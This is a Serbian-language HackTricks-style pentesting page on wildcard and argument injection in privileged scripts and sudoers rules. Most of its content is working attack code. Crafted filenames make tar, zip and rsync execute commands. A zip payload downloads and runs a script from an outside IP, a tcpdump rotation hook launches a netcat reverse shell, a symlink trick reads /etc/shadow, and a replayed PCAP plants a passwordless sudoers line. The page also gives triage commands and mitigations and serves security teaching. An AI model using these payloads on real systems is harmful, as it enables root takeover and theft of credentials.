# Wildcards: dodatni trikovi

{{#include ../../banners/hacktricks-training.md}}

> Do **argument injection**-a pomoću wildcard-a (poznatog i kao *glob*) dolazi kada privilegovana skripta pokrene Unix binarnu datoteku kao što su `tar`, `chown`, `rsync`, `zip`, `7z`, … sa wildcard-om bez navodnika, kao što je `*`.  
> Pošto shell proširuje wildcard **pre** pokretanja binarne datoteke, napadač koji može da kreira datoteke u radnom direktorijumu može da napravi nazive datoteka koji počinju sa `-`, pa se oni tumače kao **opcije umesto podataka**. Tako se praktično ubacuju proizvoljne zastavice, pa čak i komande.<sup>[[6]](#references)</sup>  
> Ova stranica objedinjuje najkorisnije primitivne tehnike, novija istraživanja i savremene metode detekcije za period 2023–2025.

## chown / chmod

Možete **kopirati vlasnika/grupu ili bitove dozvola iz referentne datoteke** tako što ćete zloupotrebiti zastavicu `--reference` kada se naziv datoteke koji liči na opciju proširi pomoću wildcard-a.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Kada root kasnije izvrši nešto poput:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

Prošireni `--reference=.drf.php` nadjačava eksplicitno navedene vrednosti vlasnika i režima, zbog čega datoteke koje se poklapaju nasleđuju metapodatke iz `.drf.php` (i, uz gore opisano podešavanje, napadač može da ih menja).<sup>[[6]](#references)</sup>

Pregledajte ceo privilegovani pomoćni program, a ne samo njegovu `chown` liniju. Promena vlasništva može da ukloni bitove set-user-ID ili set-group-ID; [POSIX prepušta implementaciji da definiše ponašanje u privilegovanom slučaju](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). Kasniji `chmod` u istom poslu može da vrati te bitove na datoteke koje je ranije odabrao, menjajući ishod. Pre nego što ovo smatrate putanjom do izvršavanja sa povišenim privilegijama, proverite stvarni redosled komandi, direktorijum sa glob obrascem u koji može da se upisuje, ponašanje prema pogođenoj datoteci i linkovima, konačnog vlasnika i režim, kao i da li sistem datoteka poštuje set-user-ID. Ako pomoćni program nije moguće pročitati, ti koraci ostaju nepoznati.

*PoC i alat*: [`wildpwn`](https://github.com/localh0t/wildpwn) (kombinovani napad).<sup>[[7]](#references)</sup>
Pogledajte i klasični rad kompanije DefenseCode za detalje.<sup>[[6]](#references)</sup>

---

## GNU `cp` u privilegovanoj skripti

Pregledajte skriptu koja se pokreće kao root, a kopira iz radnog direktorijuma koji je izabrao njen pozivalac koristeći goli glob obrazac, na primer `cp .version * /etc/app/staged/`, kada korisnik sa nižim privilegijama može da kreira datoteke u tom direktorijumu. GNU `cp` može da protumači naziv datoteke koji počinje crticom, a koji je proširen iz `*`, kao opciju. Njegova opcija `--preserve=mode` može da sačuva bitove režima izvorne datoteke u novoj kopiji, a `--target-directory` može da promeni odredište kopiranja. Da bi se potvrdio bilo koji od ovih efekata, potrebno je proveriti tačnu granu skripte, stanje odredišta, efektivne privilegije, pravila sistema datoteka i ponašanje GNU `cp`; samo tekst sudo pravila ili skripte ne dokazuje eskalaciju. Dodavanje prefiksa `./` operandima ili završetak obrade opcija pomoću `--` sprečava da GNU `cp` ovako protumači nazive koji počinju crticom ([GNU Coreutils FAQ](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [priručnik za `cp`](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

Izvršite proizvoljne komande iskorišćavanjem GNU tar funkcije **checkpoint** i njenih checkpoint akcija.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Kada root pokrene, na primer, `tar -czf /root/backup.tgz *`, `shell.sh` se izvršava kao root.<sup>[[10]](#references)</sup>

### bsdtar / macOS napomena o preusmeravanju kompresora

Podrazumevani `tar` u novijim verzijama macOS-a (zasnovan na `libarchive`) ne pruža GNU tar interfejs `--checkpoint`, ali bsdtar dokumentuje **--use-compress-program** za izbor spoljnog kompresora.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Kada privilegovana skripta pokrene `tar -cf backup.tar *`, ona bira `sh` preko napadačeve `PATH` putanje, a bsdtar ga pokreće kao kompresor.<sup>[[11]](#references)</sup> Ovo dokazuje option injection, ali samo po sebi ne predstavlja pouzdan primitiv za izvršavanje proizvoljnih komandi: naziv datoteke kreiran pomoću džokera ne može da sadrži `/`, a bsdtar prosleđuje arhivske podatke, a ne komandu ljuske koju je izabrao napadač. Za izvršavanje koda neophodan je i izvršni fajl koji se može kontrolisati i koji se pronalazi preko `PATH` putanje, ili drugi kanal argumenata kojim se može navesti koristan program.

---

## rsync

`rsync` omogućava da preko zastavica komandne linije kao što su `-e` i `--rsync-path` zamenite udaljenu ljusku ili udaljeni binarni fajl.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

Ako root kasnije arhivira direktorijum pomoću `rsync -az * backup:/srv/`, ubačena zastavica može da pokrene shell preko mehanizma remote-shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` režim).

---

## 7-Zip / 7z / 7za

Čak i kada privilegovana skripta *defanzivno* dodaje `--` ispred wildcarda (kako bi zaustavila parsiranje opcija), 7-Zip CLI prihvata **datoteke sa listama fajlova** ako se ispred naziva datoteke doda `@`. Kombinovanjem toga sa symlinkom možete *eksfiltrirati proizvoljne datoteke*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

Ako root izvrši nešto poput:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip će pokušati da pročita `root.txt` (→ `/etc/shadow`) kao listu datoteka i odustati, **ispisujući sadržaj na stderr**.<sup>[[13]](#references)</sup>

Ovo funkcioniše i uz `-- *`, zato što 7-Zip CLI izričito prihvata i obična imena datoteka i `@listfiles` kao pozicione ulaze, pa se sa doslovnim imenom datoteke kao što je `@root.txt` i dalje postupa posebno.<sup>[[13]](#references)</sup>

---

## zip

Postoje dva veoma praktična primitiva kada aplikacija prosleđuje korisnički kontrolisana imena datoteka komandi `zip` (putem wildcard-a ili nabrajanjem imena bez `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE putem test hook-a: `-T` omogućava „test arhive“, a `-TT <cmd>` zamenjuje tester proizvoljnim programom (dugi oblik: `--unzip-command <cmd>`). Ako možete da ubacite imena datoteka koja počinju sa `-`, podelite opcije između različitih imena datoteka kako bi parsiranje kratkih opcija funkcionisalo.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Napomene
- NE pokušavajte s jednim imenom datoteke poput `'-T -TT <cmd>'` — kratke opcije se parsiraju znak po znak, pa neće raditi. Koristite zasebne tokene kao što je prikazano.<sup>[[3]](#references)</sup>
- Ako aplikacija uklanja kose crte iz imena datoteka, preuzmite datoteku sa osnovnog hosta/IP adrese (podrazumevana putanja `/index.html`), sačuvajte je lokalno pomoću `-O`, pa je izvršite.<sup>[[3]](#references)</sup>
- Možete da otklanjate greške u parsiranju pomoću `-sc` (prikazuje obrađeni argv) ili `-h2` (detaljnija pomoć) da biste razumeli kako se obrađuju vaši tokeni.<sup>[[3]](#references)</sup>

Primer (lokalno ponašanje u zip-u 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: Ako web sloj prikazuje `zip` stdout/stderr (što je često kod naivnih wrappera), ubačene zastavice poput `--help` ili greške zbog neispravnih opcija pojaviće se u HTTP odgovoru, potvrđujući command-line injection i olakšavajući podešavanje payload-a.<sup>[[3]](#references)</sup>

---

## Dodatni kandidati za option injection

Kada privilegovani wrapper proširi upisiv direktorijum pomoću wildcard-a, vredi proveriti ove dokumentovane opcione mehanizme.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Zastavica za zloupotrebu | Efekat |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Prosleđuje komandni niz shell-u |
| `git`   | `-c core.sshCommand=<cmd>` | Koristi `<cmd>` umesto SSH-a za Git fetch/push |
| `scp`   | `-S <program>` | Koristi alternativni program za SSH-kompatibilnu vezu |

Ovi mehanizmi su korisne provere pored klasičnih *tar/rsync/zip*.

---

## Pronalaženje ranjivih wrappera i zadataka

Nedavne studije slučaja i smernice za detekciju pokazuju da wildcard/argv injection više nije samo problem **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Ista klasa grešaka se stalno pojavljuje u:

- web funkcijama koje „preuzimaju sve kao zip/tar“ iz direktorijuma za otpremanje kojima upravlja napadač
- vendor/appliance debug shell-ovima koji izlažu **tcpdump** wrapper sa poljima za naziv datoteke/filter kojima upravlja napadač
- zadacima za pravljenje rezervnih kopija ili rotaciju koji pokreću `tar`, `rsync`, `7z`, `zip`, `chown` ili `chmod` nad upisivim direktorijumima

Korisne komande za trijažu (poziv `pspy` koristi dokumentovane zastavice za procesne/događajne datoteke i interval).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Brze heuristike:

- `-- *` je dobro rešenje za mnoge GNU alate, ali **ne** i za `7z`/`7za`, jer se `@listfiles` obrađuju zasebno.<sup>[[13]](#references)</sup>
- Za `zip` potražite wrapper-e koji direktno nabrajaju imena fajlova pod kontrolom korisnika; razdvajanje kratkih opcija (`-T` + `-TT <cmd>`) i dalje funkcioniše čak i bez shell glob-a.<sup>[[2]](#references)[[3]](#references)</sup>
- Za `tcpdump` obratite posebnu pažnju na wrapper-e koji vam omogućavaju da kontrolišete **imena izlaznih fajlova**, **podešavanja rotacije** ili argumente za **reprodukciju capture fajla**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE putem argv injection-a u wrapper-ima

Kada restricted shell ili vendor wrapper sastavlja komandnu liniju za `tcpdump` konkatenacijom polja pod kontrolom korisnika (npr. parametra „ime fajla“) bez strogog citiranja/provere, možete da ubacite dodatne `tcpdump` zastavice. Kombinacija `-G` (vremenska rotacija), `-W` (ograničenje broja fajlova) i `-z <cmd>` (komanda nakon rotacije) omogućava proizvoljno izvršavanje komandi kao korisnik koji pokreće tcpdump (često root na appliance uređajima).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Preduslovi:

- Možete da utičete na `argv` prosleđen programu `tcpdump` (npr. preko wrapper-a kao što je `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper ne sanitizuje razmake ni tokene koji počinju znakom `-` u polju za ime fajla.<sup>[[4]](#references)</sup>

Klasični PoC (pokreće reverse shell skriptu sa putanje u koju može da se upisuje).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Detalji:

- `-G 1` rotira svake sekunde, a `-W 1` zaustavlja rad nakon jedne rotirane datoteke; capture mora da primi odgovarajući paket pre rotacije.<sup>[[18]](#references)</sup>
- `-z <cmd>` pokreće post-rotate komandu jednom pri svakoj rotaciji i prosleđuje joj putanju zatvorenog savefile-a kao argument; proverite da li se prosleđivanje argumenata skripti/interpreteru poklapa s vašim payload-om.<sup>[[18]](#references)</sup>

Varijante bez prenosivog medijuma:

- Ako imate neku drugu primitivu za upisivanje datoteka (npr. zaseban command wrapper koji omogućava preusmeravanje izlaza), smestite skriptu na poznatu putanju i pokrenite `-z /path/script.sh`; neka skripta po potrebi sama pozove `/bin/sh`.<sup>[[18]](#references)</sup>
- Ako vendor wrapper omogućava izbor putanje rotirane datoteke, proverite kontrolu te putanje samo u kombinaciji s post-rotate komandom koja tumači njen savefile argument; sama kontrola putanje ne izvršava sadržaj datoteke.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump sa wildcards/dodatnim argumentima → proizvoljno pisanje/čitanje i root

Primer lošeg sudoers obrasca:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

Pravilo ostavlja nekoliko dostupnih opcija u tcpdump-ovom dokumentovanom parseru:<sup>[[3]](#references)[[18]](#references)</sup>
- Glob `*` i permisivni obrasci ograničavaju samo prvi argument `-w`. `tcpdump` prihvata više opcija `-w`; poslednja ima prednost.<sup>[[3]](#references)[[18]](#references)</sup>
- Pravilo ne ograničava druge opcije, pa su dozvoljene `-Z`, `-r`, `-V` itd.<sup>[[3]](#references)[[18]](#references)</sup>

Relevantni primitivni elementi dokumentovani su u nastavku.<sup>[[3]](#references)[[18]](#references)</sup>
- Zamenite odredišnu putanju drugim `-w` (prvi samo zadovoljava sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal unutar prvog `-w` radi izlaska iz ograničenog stabla.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Nametnite vlasništvo nad izlaznim datotekama pomoću `-Z root` (kreira datoteke u vlasništvu root korisnika bilo gde).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Upis proizvoljnog sadržaja ponovnim reprodukovanjem posebno napravljenog PCAP-a pomoću `-r` (npr. za dodavanje linije u sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Napravite PCAP koji sadrži tačan ASCII payload i upišite ga kao root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Proizvoljno čitanje datoteke/secret leak pomoću `-V <file>` (tumači listu savefiles). Dijagnostika grešaka često ponavlja linije, što može izazvati leak sadržaja.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: ubrizgavanje Zip argumenata do RCE-a + pogrešna sudo konfiguracija tcpdump-a za eskalaciju privilegija](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Potpuni lanac eksploatacije](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Otkriven potencijalni shell putem ubrizgavanja džokera](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Povratak u budućnost: Unix džokeri podivljali (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` poziv](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` poziv](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar контролне тачке](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Упутство за bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Упутство за rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Синтакса командне линије за 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Упутство за flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Документација за Git конфигурацију](https://git-scm.com/docs/git-config)
- [17] [OpenBSD упутство за `scp`](https://man.openbsd.org/scp)
- [18] [Упутство за tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
